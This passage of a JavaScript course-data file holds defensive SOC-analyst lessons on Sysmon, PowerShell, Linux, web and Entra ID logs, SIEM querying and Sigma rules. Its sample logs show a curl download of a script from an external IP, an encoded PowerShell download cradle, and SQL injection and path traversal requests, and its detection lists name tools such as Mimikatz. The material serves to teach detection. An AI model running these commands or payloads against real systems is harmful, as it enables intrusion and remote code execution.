  <tr><td><b>7</b></td><td>Image loaded (DLL)</td><td>DLL side-loading, unusual modules</td></tr>
  <tr><td><b>8</b></td><td>CreateRemoteThread</td><td>Process injection</td></tr>
  <tr><td><b>10</b></td><td>ProcessAccess</td><td>Access to <code>lsass.exe</code> = credential dumping</td></tr>
  <tr><td><b>11</b></td><td>FileCreate</td><td>Dropped payloads, files in Startup folders</td></tr>
  <tr><td><b>12/13/14</b></td><td>Registry create/delete, value set, rename</td><td>Run-key persistence, defense evasion</td></tr>
  <tr><td>15</td><td>FileCreateStreamHash</td><td>Alternate data streams, Mark-of-the-Web (Zone.Identifier)</td></tr>
  <tr><td>17/18</td><td>Pipe created/connected</td><td>Named pipes used by Cobalt Strike and PsExec</td></tr>
  <tr><td><b>22</b></td><td>DNS query</td><td>Which process resolved which domain</td></tr>
  <tr><td><b>23 / 26</b></td><td>FileDelete (archived) / FileDeleteDetected</td><td>Anti-forensics, wiper behavior</td></tr>
  <tr><td>25</td><td>ProcessTampering</td><td>Process hollowing / herpaderping</td></tr>
</table>

<h3>Reading a Sysmon Event 1</h3>
<pre><code>EventID: 1
UtcTime: 2026-10-14 13:02:19.441
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...
User: CORP\\aturner
IntegrityLevel: Medium
Hashes: SHA256=9F2B...C41A
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" /n "C:\\Users\\aturner\\Downloads\\Invoice_8812.docm"</code></pre>
<p>Red flags stack up: Word spawning PowerShell (Office should almost never do this), <code>-nop</code> (no profile), <code>-w hidden</code> (hidden window), <code>-enc</code> (Base64 UTF-16LE encoded command), and a macro-enabled document from Downloads. Decoding the Base64 yields <code>IEX (New-Object Net.WebClient)...</code> &mdash; a classic <b>download cradle</b>. This is ATT&amp;CK T1566.001 (spearphishing attachment) leading to T1059.001 (PowerShell).</p>

<div class="callout tip"><b>Tip:</b> Decode <code>-enc</code> payloads with CyberChef: "From Base64" then "Decode text (UTF-16LE)." In PowerShell: <code>[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('...'))</code>. Do this in an analysis VM, and never run the decoded content.</div>

<h3>PowerShell logging</h3>
<ul>
  <li><b>4104 &ndash; Script Block Logging</b> (<code>Microsoft-Windows-PowerShell/Operational</code>): records the actual code executed, <i>after</i> deobfuscation layers are unwrapped at runtime. The single most valuable PowerShell log. PowerShell auto-logs suspicious blocks as "Warning" level even when not fully enabled.</li>
  <li><b>4103 &ndash; Module Logging</b>: pipeline execution details and parameters.</li>
  <li><b>Transcription</b>: writes full session input/output to text files on disk or a share.</li>
  <li><b>400/403/600</b> in the legacy "Windows PowerShell" log: engine start/stop; <code>HostVersion=2.0</code> reveals a <b>downgrade attack</b> to bypass logging and AMSI.</li>
</ul>
<p>Suspicious strings in 4104: <code>IEX</code>/<code>Invoke-Expression</code>, <code>DownloadString</code>, <code>FromBase64String</code>, <code>Reflection.Assembly</code>, <code>VirtualAlloc</code>, <code>AmsiUtils</code>, <code>-bxor</code>, <code>Invoke-Mimikatz</code>, character-joining obfuscation such as <code>('Ne'+'w-Ob'+'ject')</code>.</p>

<h3>Queries</h3>
<h4>Splunk: Office spawning script interpreters</h4>
<pre><code>index=sysmon EventCode=1
  (ParentImage="*\\WINWORD.EXE" OR ParentImage="*\\EXCEL.EXE" OR ParentImage="*\\OUTLOOK.EXE")
  (Image="*\\powershell.exe" OR Image="*\\cmd.exe" OR Image="*\\wscript.exe" OR Image="*\\mshta.exe")
| table _time host User ParentImage Image CommandLine</code></pre>
<h4>KQL (Defender XDR advanced hunting)</h4>
<pre><code>DeviceProcessEvents
| where Timestamp &gt; ago(7d)
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","outlook.exe","powerpnt.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","wscript.exe","mshta.exe","rundll32.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine</code></pre>
<h4>KQL: script block hunting</h4>
<pre><code>Event
| where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
| where RenderedDescription has_any ("FromBase64String","DownloadString","IEX","AmsiUtils","VirtualAlloc")
| project TimeGenerated, Computer, RenderedDescription</code></pre>

<div class="callout real"><b>On the job:</b> In environments with a commercial EDR, you will usually query the EDR's own tables (e.g., <code>DeviceProcessEvents</code>) rather than Sysmon. The concepts map one to one: process creation, network, file, registry, image load. Learn the Sysmon IDs and you can read any EDR's telemetry.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.2 lists suspicious processes, unauthorized changes and PowerShell abuse as host indicators. BTL1 frequently gives a Sysmon log and asks for the parent process, the decoded command or the ATT&amp;CK technique.</div>
`,
  keyTerms: [
    ["Sysmon", "Sysinternals driver that logs detailed process, network, file and registry telemetry"],
    ["Sysmon Event 1", "Process creation with command line, hashes and parent process"],
    ["Sysmon Event 10", "Process access; access to lsass.exe indicates credential dumping"],
    ["Sysmon Event 22", "DNS query attributed to the process that made it"],
    ["Script Block Logging (4104)", "Records deobfuscated PowerShell code as it executes"],
    ["Encoded command", "PowerShell -EncodedCommand parameter carrying Base64 UTF-16LE script"],
    ["Download cradle", "One-liner that downloads and executes code in memory, e.g. IEX(New-Object Net.WebClient).DownloadString()"],
    ["Downgrade attack", "Forcing PowerShell v2 to evade AMSI and script block logging"]
  ],
  standards: ["MITRE ATT&CK T1059.001", "MITRE ATT&CK T1566.001", "MITRE ATT&CK T1003.001"],
  labs: ["lab-powershell-triage", "lab-windows-events"]
},
{
  id: "p2-m2-l4",
  module: "p2-m2",
  title: "Linux, Web and Cloud Identity Logs",
  minutes: 20,
  objectives: [
    "Locate and read Linux authentication and audit logs",
    "Identify web attacks in Apache/Nginx access logs",
    "Analyze Microsoft Entra ID sign-in logs and AWS CloudTrail for account compromise",
    "Recognize impossible travel, MFA fatigue and token theft patterns"
  ],
  html: `
<p>Not everything is Windows. Internet-facing web servers usually run Linux, and most identity now lives in the cloud. A complete analyst can read all three.</p>

<h3>Linux logs</h3>
<table>
  <tr><th>Location</th><th>Content</th></tr>
  <tr><td><code>/var/log/auth.log</code> (Debian/Ubuntu) or <code>/var/log/secure</code> (RHEL)</td><td>SSH logons, sudo, su, PAM</td></tr>
  <tr><td><code>journalctl</code></td><td>systemd journal (binary); many modern distros log here first</td></tr>
  <tr><td><code>/var/log/audit/audit.log</code></td><td>auditd: syscalls, file watches, execve with arguments</td></tr>
  <tr><td><code>/var/log/syslog</code> or <code>messages</code></td><td>General system messages, cron</td></tr>
  <tr><td><code>~/.bash_history</code></td><td>Shell history (easily cleared &mdash; absence is suspicious)</td></tr>
  <tr><td><code>wtmp</code> / <code>btmp</code> / <code>lastlog</code></td><td>Successful / failed / last logins (read with <code>last</code>, <code>lastb</code>)</td></tr>
</table>
<pre><code>Oct 14 03:14:07 web01 sshd[4121]: Failed password for root from 45.155.205.233 port 40122 ssh2
Oct 14 03:14:09 web01 sshd[4121]: Failed password for root from 45.155.205.233 port 40122 ssh2
Oct 14 03:16:52 web01 sshd[4188]: Accepted password for deploy from 45.155.205.233 port 40870 ssh2
Oct 14 03:17:30 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://45.155.205.233/x.sh -o /tmp/.x</code></pre>
<p>Brute force, success on a different account, immediate privilege use and a download to a hidden file in <code>/tmp</code>: a compromised host. Quick command-line triage:</p>
<pre><code>grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head
grep "Accepted" /var/log/auth.log
journalctl -u ssh --since "2026-10-14 03:00"
ausearch -m EXECVE -ts today | aureport -x --summary</code></pre>

<h3>Web server access logs</h3>
<pre><code>203.0.113.77 - - [14/Oct/2026:10:41:02 +0000] "GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--%20 HTTP/1.1" 500 512 "-" "sqlmap/1.8"
203.0.113.77 - - [14/Oct/2026:10:44:19 +0000] "GET /../../../../etc/passwd HTTP/1.1" 400 226 "-" "Mozilla/5.0"
198.51.100.9 - - [14/Oct/2026:11:02:55 +0000] "POST /uploads/img_204.php HTTP/1.1" 200 41 "-" "Mozilla/5.0"</code></pre>
<p>Line 1: URL-decoded <code>' UNION SELECT</code> &mdash; SQL injection by the sqlmap tool. Line 2: path traversal. Line 3: a POST to a <code>.php</code> file inside an uploads folder returning 200 &mdash; a likely <b>web shell</b> (T1505.003). Status codes matter: a long run of 404s is scanning; a 200 on an exploit path means it may have worked.</p>

<h3>Microsoft Entra ID sign-in logs</h3>
<p>Key fields in <code>SigninLogs</code>: <code>UserPrincipalName</code>, <code>IPAddress</code>, <code>Location</code>, <code>AppDisplayName</code>, <code>ResultType</code> (0 = success; 50126 = invalid credentials; 50074/50076 = MFA required; 500121 = MFA failed/denied; 50053 = locked), <code>ConditionalAccessStatus</code>, <code>RiskLevelDuringSignIn</code>, <code>AuthenticationRequirement</code>, <code>UserAgent</code>.</p>
<h4>KQL: MFA fatigue (push bombing) followed by success</h4>
<pre><code>SigninLogs
| where TimeGenerated &gt; ago(1d)
| summarize Denied = countif(ResultType == "500121"), Success = countif(ResultType == "0"),
            IPs = make_set(IPAddress) by UserPrincipalName, bin(TimeGenerated, 30m)
| where Denied &gt;= 5 and Success &gt;= 1</code></pre>
<h4>SPL equivalent (Azure AD add-on data)</h4>
<pre><code>index=azure sourcetype="azure:aad:signin"
| bin _time span=30m
| stats count(eval(resultType="500121")) AS denied count(eval(resultType="0")) AS success values(ipAddress) AS ips BY userPrincipalName _time
| where denied&gt;=5 AND success&gt;=1</code></pre>

<h3>Identity attack patterns</h3>
<ul>
  <li><b>Impossible travel</b>: successful sign-ins from locations too far apart for the elapsed time. Often FP from VPNs and mobile carriers; confirm with user agent and device ID.</li>
  <li><b>Adversary-in-the-middle (AiTM) phishing</b> (Evilginx, Tycoon 2FA kits): the attacker proxies the real login and steals the <i>session cookie</i>, so MFA shows as satisfied. Look for a sign-in from an unusual IP immediately after a user clicked a phishing link, then new inbox rules or MFA method registration.</li>
  <li><b>Token replay</b>: same session ID used from a new IP or ASN. Token protection and Conditional Access "compliant device" requirements mitigate it.</li>
  <li><b>Device code phishing</b>: abuse of the OAuth device code flow; look for <code>AuthenticationProtocol == "deviceCode"</code> from users who never use it.</li>
</ul>

<h3>AWS CloudTrail essentials</h3>
<p>Watch for <code>ConsoleLogin</code> without MFA, <code>CreateAccessKey</code> for another user, <code>AttachUserPolicy</code> with AdministratorAccess, <code>StopLogging</code> or <code>DeleteTrail</code> (defense evasion), <code>PutBucketPolicy</code> making S3 public, and API calls from unfamiliar ASNs using long-term keys. <code>GetCallerIdentity</code> from a new IP is often the first thing an attacker runs with stolen keys.</p>

<div class="callout real"><b>On the job:</b> Business email compromise investigations almost always start in the identity logs, then move to the unified audit log (<code>OfficeActivity</code> / <code>CloudAppEvents</code>) to look for <code>New-InboxRule</code>, <code>Set-Mailbox</code> forwarding and <code>MailItemsAccessed</code>.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.2 covers network, host and application indicators, including web log analysis; objective 1.1 includes cloud and identity concepts. BTL1 includes Linux log reading with grep and awk.</div>
`,
  keyTerms: [
    ["auth.log / secure", "Linux files recording SSH, sudo and PAM authentication events"],
    ["auditd", "Linux kernel auditing framework recording syscalls such as execve"],
    ["Web shell", "Malicious script on a web server giving an attacker remote command execution"],
    ["SigninLogs ResultType", "Entra ID sign-in result code; 0 is success, 50126 invalid credentials, 500121 MFA denied"],
    ["MFA fatigue", "Repeated push prompts sent until the user approves one"],
    ["AiTM phishing", "Reverse-proxy phishing that steals session cookies to bypass MFA"],
    ["Impossible travel", "Sign-ins from distant locations within an unrealistically short time"],
    ["CloudTrail", "AWS service that logs control-plane API activity"]
  ],
  standards: ["MITRE ATT&CK T1621", "MITRE ATT&CK T1557", "MITRE ATT&CK T1505.003", "MITRE ATT&CK T1190"],
  labs: ["lab-log-bruteforce", "lab-siem-hunt"]
}
);

/* ===================== p2-m3 SIEM & Detection Engineering ===================== */
CP.lessons.push(
{
  id: "p2-m3-l1",
  module: "p2-m3",
  title: "How a SIEM Works",
  minutes: 16,
  objectives: [
    "Describe the SIEM data pipeline from collection to alerting",
    "Compare major SIEM platforms and their query languages",
    "Explain correlation rules, scheduled versus real-time detections and incidents",
    "Understand cost, retention and data tiering trade-offs"
  ],
  html: `
<p>A <b>Security Information and Event Management (SIEM)</b> platform centralizes logs from across the environment, makes them searchable, and runs detection logic to generate alerts. It is the analyst's primary workbench.</p>

<h3>The pipeline</h3>
<ol>
  <li><b>Collection</b> &mdash; agents (Splunk Universal Forwarder, Azure Monitor Agent, Elastic Agent), syslog collectors, API connectors for SaaS and cloud (Microsoft 365, Okta, AWS), and native integrations.</li>
  <li><b>Parsing</b> &mdash; extract fields from raw text. Splunk largely parses at search time ("schema on read"); Sentinel and Elastic mostly parse at ingest into tables or indices.</li>
  <li><b>Normalization and enrichment</b> &mdash; map to CIM/ASIM/ECS, add GeoIP, asset criticality, user department, threat intel matches.</li>
  <li><b>Storage</b> &mdash; hot (fast, expensive, searchable for alerts), warm/cold or data lake (cheap, slower), archive (compliance).</li>
  <li><b>Detection</b> &mdash; scheduled queries, streaming/real-time rules, correlation across sources, UEBA (User and Entity Behavior Analytics) anomaly models, threat intel matching.</li>
  <li><b>Alerting and case management</b> &mdash; alerts grouped into incidents, assigned, investigated and closed with a classification.</li>
</ol>

<h3>Platforms you will meet</h3>
<table>
  <tr><th>Platform</th><th>Query language</th><th>Notes</th></tr>
  <tr><td>Splunk Enterprise Security (Cisco)</td><td>SPL</td><td>Market veteran; notables, risk-based alerting, huge app ecosystem</td></tr>
  <tr><td>Microsoft Sentinel</td><td>KQL</td><td>Cloud-native; now delivered inside the unified Microsoft Defender portal with Defender XDR; data lake tier</td></tr>
  <tr><td>Google Security Operations (formerly Chronicle)</td><td>YARA-L 2.0, UDM search</td><td>Fixed-price-style ingestion, long retention</td></tr>
  <tr><td>Elastic Security</td><td>KQL (Kibana), EQL, ES|QL</td><td>Open detection rules on GitHub</td></tr>
  <tr><td>IBM QRadar / CrowdStrike Falcon Next-Gen SIEM / Sumo Logic / Wazuh (open source)</td><td>AQL, CQL, others</td><td>QRadar SaaS was sold to Palo Alto Networks (Cortex XSIAM migration)</td></tr>
</table>
<p>Do not panic about learning every language. If you learn <b>SPL and KQL</b> well, the concepts (filter, aggregate, join, time-bucket) transfer everywhere.</p>

<h3>Detection types</h3>
<ul>
  <li><b>Atomic / signature</b> &mdash; a single event matches: "Event 1102 occurred."</li>
  <li><b>Threshold</b> &mdash; count exceeds N in a window: "20 failed logons in 5 minutes."</li>
  <li><b>Correlation / sequence</b> &mdash; multiple events in order: "failed logons, then success, then new inbox rule."</li>
  <li><b>Anomaly / UEBA</b> &mdash; deviation from a learned baseline: "user downloaded 40x their normal SharePoint volume."</li>
  <li><b>Threat intel match</b> &mdash; an observed IP, domain or hash matches a feed.</li>
</ul>

<h3>Correlation example (KQL)</h3>
<pre><code>let failures = SigninLogs
  | where ResultType == "50126"
  | summarize Fails = count() by UserPrincipalName, IPAddress, bin(TimeGenerated, 10m)
  | where Fails &gt;= 10;
let successes = SigninLogs
  | where ResultType == "0"
  | project SuccessTime = TimeGenerated, UserPrincipalName, IPAddress;
failures
| join kind=inner successes on UserPrincipalName, IPAddress
| where SuccessTime between (TimeGenerated .. (TimeGenerated + 30m))</code></pre>
<h3>Same idea in SPL</h3>
<pre><code>index=azure sourcetype="azure:aad:signin" (resultType=50126 OR resultType=0)
| bin _time span=10m
| stats count(eval(resultType="50126")) AS fails count(eval(resultType="0")) AS success BY userPrincipalName ipAddress _time
| where fails&gt;=10 AND success&gt;=1</code></pre>

<div class="callout warn"><b>Warning:</b> Scheduled rules have a <b>run frequency</b> and a <b>lookback</b>. If a rule runs every hour but looks back only 30 minutes, half the time is never examined. If it runs every 5 minutes with a 1-hour lookback, the same event alerts 12 times unless you deduplicate (Sentinel's "event grouping" and alert suppression; Splunk throttling).</div>

<h3>Cost and retention</h3>
<p>SIEM bills scale with data volume, so decisions about what to collect are security decisions. Common practices: filter noisy events at the collector (e.g., drop Windows 5156 firewall allows), route verbose sources to a data lake, and keep compliance-driven retention (PCI DSS requires 12 months of audit history with 3 months immediately available) in cheaper tiers. Investigations frequently need data older than 30 days, so know how to query the archive in your platform before you need it at 2 a.m.</p>

<div class="callout real"><b>On the job:</b> When you join a SOC, ask early: "Which log sources are onboarded, what is the retention per source, and what is <i>not</i> collected?" Knowing your blind spots is as important as knowing your tools.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.3 covers SIEM, SOAR, EDR and log analysis tools; questions often ask which tool fits a need (e.g., correlating events from many sources = SIEM). SC-200 is entirely Sentinel/Defender and KQL-heavy.</div>
`,
  keyTerms: [
    ["SIEM", "Platform that aggregates, normalizes, searches and correlates security logs and raises alerts"],
    ["Parsing", "Extracting structured fields from raw log data"],
    ["Correlation rule", "Detection logic that links multiple events, often across sources, in a time window"],
    ["UEBA", "User and Entity Behavior Analytics: baselining normal behavior to flag anomalies"],
    ["Lookback", "Time range a scheduled detection searches each time it runs"],
    ["Data tiering", "Placing logs in hot, cold or data-lake storage based on value and cost"],
    ["SPL / KQL", "Splunk Search Processing Language / Kusto Query Language"]
  ],
  standards: ["NIST SP 800-92", "PCI DSS v4.0.1 Req. 10"],
  labs: ["lab-siem-hunt"]
},
{
  id: "p2-m3-l2",
  module: "p2-m3",
  title: "Querying Like an Analyst: SPL and KQL Side by Side",
  minutes: 25,
  objectives: [
    "Write filter, aggregate, sort and time-bucket queries in SPL and KQL",
    "Use stats/summarize, dc/dcount, values/make_set and top patterns",
    "Join or enrich data across tables",
    "Apply a query-building method that keeps searches fast and correct"
  ],
  html: `
<p>Most of an analyst's day is spent asking the SIEM questions. Being fluent in a query language is the difference between a 2-minute and a 2-hour investigation. This lesson teaches the same operations in Splunk SPL and Microsoft KQL so you can translate between them.</p>

<h3>Mental model</h3>
<p>Both languages are <b>pipelines</b>: start with a data set, then pipe it through commands that filter, reshape and aggregate. Always filter as early as possible (time range, index/table, event code) to keep queries fast.</p>

<h3>Rosetta stone</h3>
<table>
  <tr><th>Operation</th><th>SPL</th><th>KQL</th></tr>
  <tr><td>Choose data</td><td><code>index=wineventlog sourcetype=XmlWinEventLog</code></td><td><code>SecurityEvent</code></td></tr>
  <tr><td>Time range</td><td><code>earliest=-24h</code></td><td><code>| where TimeGenerated &gt; ago(24h)</code></td></tr>
  <tr><td>Filter</td><td><code>EventCode=4625 user!="svc_*"</code></td><td><code>| where EventID == 4625 and TargetUserName !startswith "svc_"</code></td></tr>
  <tr><td>Contains</td><td><code>CommandLine="*mimikatz*"</code></td><td><code>| where CommandLine has "mimikatz"</code> (or <code>contains</code>)</td></tr>
  <tr><td>Select columns</td><td><code>| table _time host user</code></td><td><code>| project TimeGenerated, Computer, Account</code></td></tr>
  <tr><td>Count by</td><td><code>| stats count BY user</code></td><td><code>| summarize count() by Account</code></td></tr>
  <tr><td>Distinct count</td><td><code>dc(host)</code></td><td><code>dcount(Computer)</code></td></tr>
  <tr><td>List values</td><td><code>values(host)</code></td><td><code>make_set(Computer)</code></td></tr>
  <tr><td>Time buckets</td><td><code>| bin _time span=1h</code> or <code>| timechart</code></td><td><code>bin(TimeGenerated, 1h)</code> / <code>| render timechart</code></td></tr>
  <tr><td>Sort / limit</td><td><code>| sort - count | head 10</code></td><td><code>| top 10 by count_</code> or <code>| order by count_ desc | take 10</code></td></tr>
  <tr><td>New field</td><td><code>| eval mb=bytes/1048576</code></td><td><code>| extend MB = Bytes / 1048576.0</code></td></tr>
  <tr><td>Regex extract</td><td><code>| rex field=_raw "user=(?&lt;u&gt;\\w+)"</code></td><td><code>| extend u = extract(@"user=(\\w+)", 1, RawData)</code></td></tr>
  <tr><td>Rare values</td><td><code>| rare process</code></td><td><code>| summarize count() by Process | order by count_ asc</code></td></tr>
  <tr><td>Join/lookup</td><td><code>| lookup assets.csv host OUTPUT owner</code></td><td><code>| join kind=leftouter (Assets) on Computer</code> or <code>lookup</code></td></tr>
</table>

<div class="callout tip"><b>Tip:</b> In KQL, prefer <code>has</code> over <code>contains</code>. <code>has</code> uses the term index and is far faster; <code>contains</code> scans substrings. Also note KQL string comparison with <code>==</code> is case-sensitive; use <code>=~</code> or <code>in~</code> for case-insensitive matching.</div>

<h3>Investigation recipes</h3>
<h4>1. What did this host do in the last hour?</h4>
<pre><code>SPL:
index=sysmon host="WS-0142" earliest=-1h
| stats count values(Image) AS processes values(DestinationIp) AS dests BY EventCode

KQL:
DeviceProcessEvents
| where Timestamp &gt; ago(1h) and DeviceName startswith "ws-0142"
| project Timestamp, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
| order by Timestamp asc</code></pre>

<h4>2. Which hosts talked to a suspicious IP?</h4>
<pre><code>SPL:
index=firewall dest_ip="91.215.85.17" earliest=-7d
| stats count min(_time) AS first max(_time) AS last sum(bytes_out) AS out BY src_ip
| convert ctime(first) ctime(last)

KQL:
DeviceNetworkEvents
| where Timestamp &gt; ago(7d) and RemoteIP == "91.215.85.17"
| summarize Connections = count(), First = min(Timestamp), Last = max(Timestamp),
            Procs = make_set(InitiatingProcessFileName) by DeviceName</code></pre>

<h4>3. Rarest processes across the fleet (stacking)</h4>
<pre><code>SPL:
index=sysmon EventCode=1 earliest=-7d
| stats dc(host) AS hosts count BY Image
| where hosts &lt;= 2
| sort hosts

KQL:
DeviceProcessEvents
| where Timestamp &gt; ago(7d)
| summarize Hosts = dcount(DeviceName), Runs = count() by SHA256, FileName, FolderPath
| where Hosts &lt;= 2
| order by Hosts asc</code></pre>

<h4>4. Failed logons over time (visual)</h4>
<pre><code>SPL:
index=wineventlog EventCode=4625 earliest=-24h | timechart span=15m count BY IpAddress limit=5

KQL:
SecurityEvent
| where TimeGenerated &gt; ago(24h) and EventID == 4625
| summarize count() by bin(TimeGenerated, 15m), IpAddress
| render timechart</code></pre>

<h3>A method for building queries</h3>
<ol>
  <li><b>Start narrow and look at raw events.</b> Run the base filter, read 5&ndash;10 raw results, confirm field names.</li>
  <li><b>Add one pipe at a time.</b> Check output after each stage. Most bugs are a misspelled field that silently returns nothing.</li>
  <li><b>Aggregate to see patterns</b>, then <b>drill back down</b> to raw events for evidence.</li>
  <li><b>Save useful queries</b> in your team's shared library or as saved searches/functions.</li>
</ol>

<div class="callout warn"><b>Warning:</b> "No results" does not mean "did not happen." Check: correct time range and time zone, correct index/table, field name case (KQL column names are case-sensitive), data source actually onboarded, and ingestion delay.</div>

<div class="callout real"><b>On the job:</b> Hiring managers often run a live query exercise. Being able to write a <code>stats</code>/<code>summarize</code> with a distinct count from memory, and explain why, is frequently the deciding factor for junior candidates.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 expects you to interpret query output and tool results rather than write exact syntax. SC-200 and Splunk Core Certified User/Power User test syntax directly. BTL1 practical uses Splunk-style searching.</div>
`,
  keyTerms: [
    ["stats / summarize", "Aggregation commands in SPL / KQL"],
    ["dc / dcount", "Distinct count of values"],
    ["values / make_set", "Return the unique set of values for a field per group"],
    ["bin", "Group timestamps into fixed buckets for time-series analysis"],
    ["has vs contains", "KQL term-index match (fast) vs substring scan (slower)"],
    ["Stacking", "Counting occurrences across many systems to find rare outliers"],
    ["Lookup", "Enriching events with data from a reference table such as an asset list"]
  ],
  labs: ["lab-siem-hunt", "lab-log-bruteforce"]
},
{
  id: "p2-m3-l3",
  module: "p2-m3",
  title: "Detection Engineering and Sigma Rules",
  minutes: 22,
  objectives: [
    "Describe the detection engineering lifecycle and detection-as-code",
    "Read and write a Sigma rule and understand its fields",
    "Convert Sigma to SPL and KQL with pySigma/sigma-cli",
    "Validate detections with atomic tests and map them to ATT&CK"
  ],
  html: `
<p><b>Detection engineering</b> is the discipline of designing, building, testing and maintaining the logic that turns telemetry into alerts. It is the natural next career step for strong Tier 1/2 analysts, because the best detections come from people who have triaged the noise.</p>

<h3>The detection lifecycle</h3>
<ol>
  <li><b>Requirement</b> &mdash; from threat intel ("actor X uses rundll32 to run DLLs from AppData"), an incident lesson, a hunt finding, or an ATT&amp;CK coverage gap.</li>
  <li><b>Research</b> &mdash; how does the technique work, what telemetry does it produce, what does legitimate use look like?</li>
  <li><b>Build</b> &mdash; write the logic, ideally in a portable format such as Sigma, stored in Git.</li>
  <li><b>Test</b> &mdash; replay true-positive samples (Atomic Red Team, recorded attack data) and run against 30+ days of production data to estimate FP volume.</li>
  <li><b>Deploy</b> &mdash; through CI/CD into the SIEM with a severity, ATT&amp;CK mapping and a triage runbook.</li>
  <li><b>Maintain</b> &mdash; monitor fidelity, tune, and retire rules that no longer add value.</li>
</ol>
<p>Managing rules in Git with peer review and automated tests is called <b>detection-as-code</b>.</p>

<h3>Sigma: the generic signature format for SIEMs</h3>
<p><b>Sigma</b> is an open YAML format for describing log-based detections independently of any SIEM. The SigmaHQ repository contains thousands of community rules. A rule describes the <i>log source</i>, the <i>detection</i> logic and metadata.</p>
<pre><code>title: Suspicious Rundll32 Execution From User Writable Folder
id: 6b3c1e7a-4f2d-4e7b-9c9a-2a1d5e8f0b11
status: experimental
description: Detects rundll32 loading a DLL from AppData, Temp or Public folders, common in loader malware (e.g. IcedID, Qakbot successors).
references:
  - https://attack.mitre.org/techniques/T1218/011/
author: CyberPath
date: 2026-10-14
tags:
  - attack.defense-evasion
  - attack.t1218.011
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\\rundll32.exe'
    - OriginalFileName: 'RUNDLL32.EXE'
  selection_path:
    CommandLine|contains:
      - '\\AppData\\'
      - '\\Temp\\'
      - '\\Users\\Public\\'
  filter_legit:
    CommandLine|contains: '\\AppData\\Local\\Microsoft\\TeamsMeetingAddin\\'
  condition: all of selection_* and not filter_legit
falsepositives:
  - Some legitimate installers and per-user applications
level: medium</code></pre>
<p>Key parts: <b>logsource</b> (category process_creation maps to Sysmon 1, Security 4688 or EDR process tables), <b>detection</b> with named selections, <b>modifiers</b> like <code>|endswith</code>, <code>|contains</code>, <code>|re</code>, <code>|all</code>, <code>|base64offset</code>, and a <b>condition</b> combining them. Lists under one key are ORed; multiple keys in one map are ANDed.</p>
<p>Matching on <code>OriginalFileName</code> as well as <code>Image</code> catches attackers who copy and rename rundll32.exe &mdash; a cheap trick that defeats path-only rules.</p>

<h3>Converting Sigma</h3>
<p>The modern toolchain is <b>pySigma</b> with the <code>sigma-cli</code> front end (the legacy <code>sigmac</code> is deprecated):</p>
<pre><code>pip install sigma-cli
sigma plugin install splunk
sigma plugin install kusto
sigma convert -t splunk -p sysmon rules/rundll32_userwritable.yml
sigma convert -t kusto -p microsoft_xdr rules/rundll32_userwritable.yml</code></pre>
<p>Approximate output:</p>
<pre><code>SPL:
(Image="*\\rundll32.exe" OR OriginalFileName="RUNDLL32.EXE")
(CommandLine="*\\AppData\\*" OR CommandLine="*\\Temp\\*" OR CommandLine="*\\Users\\Public\\*")
NOT CommandLine="*\\AppData\\Local\\Microsoft\\TeamsMeetingAddin\\*"

KQL:
DeviceProcessEvents
| where (FolderPath endswith @"\\rundll32.exe" or ProcessVersionInfoOriginalFileName =~ "RUNDLL32.EXE")
  and (ProcessCommandLine contains @"\\AppData\\" or ProcessCommandLine contains @"\\Temp\\" or ProcessCommandLine contains @"\\Users\\Public\\")
  and not(ProcessCommandLine contains @"\\AppData\\Local\\Microsoft\\TeamsMeetingAddin\\")</code></pre>
<p>Note the <code>@"..."</code> verbatim strings in KQL: they stop backslashes being treated as escape characters.</p>

<div class="callout tip"><b>Tip:</b> Sigma is not the only format. Elastic publishes TOML detection rules, Google SecOps uses YARA-L, Splunk publishes its Security Content (ESCU) in YAML. Sigma is the lingua franca for sharing between teams and vendors.</div>

<h3>Testing detections</h3>
<ul>
  <li><b>Atomic Red Team</b> (Red Canary): small, ATT&amp;CK-mapped tests. Example: <code>Invoke-AtomicTest T1218.011</code> in a lab, then confirm the alert fires.</li>
  <li><b>Purple teaming</b>: red and blue work together; frameworks such as MITRE Caldera automate adversary emulation.</li>
  <li><b>Historical back-testing</b>: run the query over the last 30&ndash;90 days to estimate daily alert volume before enabling.</li>
</ul>

<h3>Good detection hygiene</h3>
<ul>
  <li>Every rule has an ATT&amp;CK mapping, severity rationale, known false positives and a <b>triage guide</b>.</li>
  <li>Prefer <b>behavior</b> (rundll32 loading from AppData) over <b>brittle indicators</b> (a single hash) &mdash; see the Pyramid of Pain.</li>
  <li>Measure each rule's true-positive rate; review rules that have not fired in a year &mdash; are they broken or is the technique absent?</li>
</ul>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.3 and 2.x touch on rule writing and tuning; you should recognize Sigma and YARA by sight and know what each is for (Sigma = logs, YARA = files/memory, Snort/Suricata = network). BTL1 may ask you to interpret a simple detection rule.</div>
`,
  keyTerms: [
    ["Detection engineering", "Designing, testing and maintaining alert logic"],
    ["Detection-as-code", "Managing detections in version control with review, testing and CI/CD"],
    ["Sigma", "Open YAML format for SIEM-agnostic log detection rules"],
    ["logsource", "Sigma section defining category, product and service the rule applies to"],
    ["Modifier", "Sigma field operator such as |contains, |endswith, |re"],
    ["pySigma / sigma-cli", "Current toolchain for converting Sigma rules into SIEM queries"],
    ["Atomic Red Team", "Library of small ATT&CK-mapped tests for validating detections"],
